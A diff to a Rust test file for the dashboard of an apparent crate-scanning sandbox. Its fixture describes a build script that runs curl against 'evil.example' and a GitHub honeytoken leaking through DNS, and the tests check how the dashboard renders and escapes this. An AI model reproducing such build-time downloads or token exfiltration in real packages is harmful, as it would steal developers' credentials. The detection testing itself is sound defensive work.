@@ -87,6 +87,12 @@ impl Dashboard {
 
     /// The status and body of a `GET`.
     async fn get(&self, path: &str) -> (u16, String) {
+        let (status, _, body) = self.fetch(path).await;
+        (status, body)
+    }
+
+    /// The status, lowercased head and body of a `GET`.
+    async fn fetch(&self, path: &str) -> (u16, String, String) {
         let mut stream = TcpStream::connect(("127.0.0.1", self.port)).await.unwrap();
         let host = format!("127.0.0.1:{}", self.port);
         let request = format!("GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n");
@@ -96,7 +102,7 @@ impl Dashboard {
         let text = String::from_utf8(raw).unwrap();
         let (head, body) = text.split_once("\r\n\r\n").unwrap();
         let status = head.split(' ').nth(1).unwrap().parse().unwrap();
-        (status, body.to_owned())
+        (status, head.to_ascii_lowercase(), body.to_owned())
     }
 
     /// The page of a job.
@@ -243,9 +249,25 @@ fn crate_file() -> CrateFile {
     }
 }
 
-/// A report whose pretty printed text is cut inside a three byte character.
-fn huge_report() -> Value {
-    json!({"ab": "€".repeat(100_000)})
+/// A check run whose build script downloaded something, with guest text
+/// that needs escaping.
+fn run_report() -> Value {
+    json!({
+        "outcome": "succeeded", "end": "Finished", "exit": {"Code": 0},
+        "run_ms": 4250, "restore_ms": 90, "payload_files": 3, "payload_bytes": 4096,
+        "stdout_tail": "", "stderr_tail": "warning: <unused>", "truncated": false,
+        "missing_packages": [],
+        "network": {"dns": ["evil.example"], "connections": [], "udp_datagrams": 0, "refused": 0, "truncated": false},
+        "leaked": [{"kind": "github_token", "via": "dns:evil.example"}],
+        "trace": {"complete": true, "opens": 12, "processes_omitted": 0, "omitted": 0,
+                  "processes": [
+                      {"pid": 1, "exe": "/usr/bin/cargo", "argv": ["cargo", "check"], "role": "cargo", "started_ms": 0},
+                      {"pid": 2, "ppid": 1, "exe": "/usr/bin/rustc", "argv": ["rustc"], "role": "rustc", "started_ms": 5},
+                      {"pid": 3, "ppid": 1, "exe": "/w/build-script-build", "argv": ["b"], "role": "build_script", "started_ms": 9},
+                      {"pid": 4, "ppid": 3, "exe": "/usr/bin/<curl>", "argv": ["curl", "https://evil.example/x"], "role": "other", "started_ms": 12, "exit": 0}
+                  ],
+                  "sensitive_opens": [], "writes_outside_work": [], "sockets": [], "tamper": []}
+    })
 }
 
 type Row = Vec<String>;
@@ -286,9 +308,9 @@ fn cells(row: &str) -> Row {
 /// The cells of the table after `heading`, one list per row.
 fn table(html: &str, heading: &str) -> Vec<Row> {
     let after = &html[html.find(heading).unwrap()..];
-    let start = after.find("<table>").unwrap();
+    let start = after.find("<table").unwrap();
     let end = after.find("</table>").unwrap();
-    after[start..end].split("<tr>").skip(1).map(cells).collect()
+    after[start..end].split("<tr").skip(1).map(cells).collect()
 }
 
 /// The items of the list after `heading`.
@@ -316,11 +338,10 @@ fn text(html: &str, open: &str, close: &str) -> String {
     unescape(&plain.split_whitespace().collect::<Vec<_>>().join(" "))
 }
 
-/// The report under the heading of a run.
-fn report(html: &str, kind: &str) -> String {
+/// The section of a run.
+fn run_section<'a>(html: &'a str, kind: &str) -> &'a str {
     let after = &html[html.find(&format!("<h2>Run: {kind}</h2>")).unwrap()..];
-    let start = after.find("<pre>").unwrap() + "<pre>".len();
-    unescape(&after[start..after.find("</pre>").unwrap()])
+    &after[..after.find("</section>").unwrap()]
 }
 
 /// A job that went through three stages and has everything recorded that
@@ -355,7 +376,7 @@ async fn seed_full_job(db: &mut Dashboard) -> JobId {
         .await
         .unwrap();
     store
-        .record_run(job, "check", "completed", &huge_report())
+        .record_run(job, "check", "completed", &run_report())
         .await
         .unwrap();
     let kind = DisclosureKind::Malicious;
@@ -481,11 +502,54 @@ async fn a_scored_and_confirmed_job_shows_everything_the_store_knows() {
     );
 
     assert!(html.find("<h2>Run: check</h2>") < html.find("<h2>Run: full</h2>"));
-    assert_eq!(report(&html, "full"), "{\n  \"network\": \"x\"\n}");
-    let check = report(&html, "check");
-    assert!(check.starts_with("{\n  \"ab\": \""));
-    assert!(check.ends_with("\n… (cut)"));
-    assert_eq!(check.matches('€').count(), 87_377);
+    let check = run_section(&html, "check");
+    assert_eq!(
+        text(check, "<ul class=\"alerts\">", "</ul>"),
+        "Honeytoken github_token left the VM through dns:evil.example"
+    );
+    assert!(check.contains("<span class=\"badge ok\">succeeded</span>"));
+    for (label, value) in [
+        ("Ended", "Finished"),
+        ("Guest", "exit code 0"),
+        ("Run time", "4.2 s"),
+        ("Payload", "3 files, 4.0 KiB"),
+        ("Files opened", "12"),
+    ] {
+        assert!(
+            check.contains(&format!("<dt>{label}</dt><dd>{value}</dd>")),
+            "{label}"
+        );
+    }
+    let tree = table(check, "<h3>Processes");
+    assert_eq!(tree.len(), 5);
+    assert_eq!(
+        tree[4],
+        row(&[
+            "└other /usr/bin/<curl>",
+            "https://evil.example/x",
+            "12 ms",
+            "",
+            "0"
+        ])
+    );
+    assert!(check.contains("<tr class=\"role-rustc compiler\">"));
+    assert!(
+        !check.contains("<curl>") && !check.contains("<unused>"),
+        "guest text is escaped"
+    );
+    assert!(check.contains("<code class=\"chip\">evil.example</code>"));
+    assert!(check.contains("href=\"/jobs/1/runs/check.json\""));
+    // A report without the expected shape still gets its section.
+    assert!(run_section(&html, "full").contains("No processes traced."));
+
+    let (status, head, body) = db.fetch("/jobs/1/runs/check.json").await;
+    assert_eq!(status, 200);
+    assert!(
+        head.contains("content-disposition: attachment; filename=\"crateward-job-1-check.json\"")
+    );
+    assert_eq!(serde_json::from_str::<Value>(&body).unwrap(), run_report());
+    assert_eq!(db.fetch("/jobs/1/runs/other.json").await.0, 404);
+    assert_eq!(db.fetch("/jobs/1/runs/check").await.0, 404);
     db.drop().await;
 }
 
